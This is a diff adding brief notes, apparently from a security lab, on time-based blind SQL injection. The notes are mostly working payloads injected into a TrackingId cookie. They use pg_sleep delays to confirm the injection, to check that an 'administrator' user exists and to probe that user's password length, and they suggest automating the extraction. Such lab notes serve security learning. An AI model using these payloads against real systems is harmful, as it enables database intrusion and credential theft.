@@ -1,0 +1,19 @@
+///BLIND SQL INJECTION WITH DELAYS AND INFORMATION RETRIEVAL
+
+check if the application will take a ten second delay to respond
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+now change 1=1 to 1=2 and see no delay just to be sure
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+now lets confirm there is a user named administrator
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+determine how many characters are in the password
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+to make work faster automate this with a shell/python script once you know the characters or include statements in the script..
